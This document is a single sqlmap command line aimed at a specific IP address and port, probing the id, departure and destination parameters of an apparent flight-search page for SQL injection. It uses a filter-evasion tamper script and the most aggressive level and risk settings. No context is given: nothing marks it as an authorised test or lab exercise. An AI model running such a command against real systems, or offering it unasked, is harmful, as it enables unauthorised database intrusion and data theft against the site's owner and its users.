sqlmap --tamper=space2comment -u "http://81.70.155.160:3000/flight?id=1&departure=Paris&destination=Tokyo" -p "id,departure,destination" --level=3 --risk=3
